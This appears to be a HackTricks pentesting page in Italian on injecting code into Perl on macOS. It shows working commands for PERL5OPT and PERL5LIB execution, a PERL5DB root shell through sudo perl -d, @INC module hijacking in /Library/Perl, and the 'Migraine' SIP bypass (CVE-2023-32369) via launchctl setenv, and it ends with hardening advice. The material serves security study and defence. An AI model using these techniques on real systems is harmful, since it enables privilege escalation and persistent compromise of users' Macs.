# macOS Perl Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Tramite le variabili d'ambiente `PERL5OPT` e `PERL5LIB`

Utilizzando la variabile d'ambiente **`PERL5OPT`** è possibile fare in modo che **Perl** esegua comandi arbitrari all'avvio dell'interprete (anche **prima** che venga analizzata la prima riga dello script target).
Ad esempio, create questo script:
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
Ora **esporta la variabile d'ambiente** ed esegui lo script **perl**:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Un'altra opzione consiste nel creare un modulo Perl (ad esempio, `/tmp/pmod.pm`):
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
E quindi usa le variabili d'ambiente in modo che il modulo venga individuato e caricato automaticamente:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod perl victim.pl
```
### Altre variabili d'ambiente interessanti

* **`PERL5DB`** – quando l'interprete viene avviato con il flag **`-d`** (debugger), il contenuto di `PERL5DB` viene eseguito come codice Perl *all'interno* del contesto del debugger.
Se puoi influenzare sia l'ambiente **sia** i flag della riga di comando di un processo Perl privilegiato, puoi fare qualcosa del genere:

```bash
export PERL5DB='system("/bin/zsh")'
sudo perl -d /usr/bin/some_admin_script.pl   # will drop a shell before executing the script
```

* **`PERL5SHELL`** – su Windows questa variabile controlla quale eseguibile della shell Perl utilizzerà quando deve avviare una shell. Viene menzionata qui solo per completezza, poiché non è rilevante su macOS.

Sebbene `PERL5DB` richieda lo switch `-d`, è comune trovare script di manutenzione o di installazione eseguiti come *root* con questo flag abilitato per il troubleshooting dettagliato, rendendo la variabile un vettore di escalation valido.

## Tramite dipendenze (@INC abuse)

È possibile elencare il percorso include che Perl cercherà (**`@INC`**) eseguendo:
```bash
perl -e 'print join("\n", @INC)'
```
L'output tipico su macOS 13/14 è simile a:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Alcune delle cartelle restituite non esistono nemmeno, tuttavia **`/Library/Perl/5.30`** esiste, *non* è protetta da SIP e si trova *prima* delle cartelle protette da SIP. Pertanto, se puoi scrivere come *root*, puoi depositare un modulo malevolo (ad esempio `File/Basename.pm`) che verrà caricato *preferibilmente* da qualsiasi script privilegiato che importi quel modulo.

> [!WARNING]
> Hai comunque bisogno di **root** per scrivere all'interno di `/Library/Perl` e macOS mostrerà un prompt **TCC** che richiede *Full Disk Access* per il processo che esegue l'operazione di scrittura.

Ad esempio, se uno script importa **`use File::Basename;`**, sarebbe possibile creare `/Library/Perl/5.30/File/Basename.pm` contenente codice controllato dall'attaccante.

## Bypass di SIP tramite Migration Assistant (CVE-2023-32369 “Migraine”)

A maggio 2023 Microsoft ha divulgato **CVE-2023-32369**, soprannominata **Migraine**, una tecnica di post-exploitation che consente a un attaccante *root* di **bypassare completamente System Integrity Protection (SIP)**.
Il componente vulnerabile è **`systemmigrationd`**, un daemon con l'entitlement **`com.apple.rootless.install.heritable`**. Qualsiasi processo figlio generato da questo daemon eredita l'entitlement e pertanto viene eseguito *al di fuori* delle restrizioni di SIP.<sup>[1]</sup>

Tra i processi figli identificati dai ricercatori vi è l'interprete firmato da Apple:<sup>[1]</sup>
```
/usr/bin/perl /usr/libexec/migrateLocalKDC …
```
Poiché Perl rispetta `PERL5OPT` (e Bash rispetta `BASH_ENV`), avvelenare l’*environment* del daemon è sufficiente per ottenere l’esecuzione arbitraria in un contesto privo di SIP:<sup>[1][2]</sup>
```bash
# As root
launchctl setenv PERL5OPT '-Mwarnings;system("/private/tmp/migraine.sh")'

# Trigger a migration (or just wait – systemmigrationd will eventually spawn perl)
open -a "Migration Assistant.app"   # or programmatically invoke /System/Library/PrivateFrameworks/SystemMigration.framework/Resources/MigrationUtility
```
Quando `migrateLocalKDC` viene eseguito, `/usr/bin/perl` si avvia con il `PERL5OPT` malevolo ed esegue `/private/tmp/migraine.sh` *prima che SIP venga nuovamente abilitato*. Da quello script è possibile, ad esempio, copiare un payload all'interno di **`/System/Library/LaunchDaemons`** o assegnare l'attributo esteso `com.apple.rootless` per rendere un file **impossibile da eliminare**.

Apple ha risolto il problema in macOS **Ventura 13.4**, **Monterey 12.6.6** e **Big Sur 11.7.7**, ma i sistemi meno recenti o non aggiornati rimangono sfruttabili.<sup>[1]</sup>

## Raccomandazioni per l'hardening

1. **Cancella le variabili pericolose** – i launchdaemon privilegiati o i cron job dovrebbero essere avviati con un ambiente pulito (`launchctl unsetenv PERL5OPT`, `env -i`, ecc.).
2. **Evita di eseguire gli interpreti come root** se non è strettamente necessario. Usa binari compilati o riduci i privilegi tempestivamente.
3. **Fornisci gli script con `-T` (taint mode)** affinché Perl ignori `PERL5OPT` e altre opzioni non sicure quando è abilitato il taint checking.
4. **Mantieni macOS aggiornato** – “Migraine” è completamente risolto nelle versioni attuali.

## Riferimenti

- [1] [Microsoft Security Blog – New macOS vulnerability, Migraine, could bypass System Integrity Protection (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [2] [Hackyboiz – macOS: Part1 - SIP Bypass](https://hackyboiz.github.io/2025/05/11/clalxk/MacOS_SIP-Bypass_en/)

{{#include ../../../banners/hacktricks-training.md}}
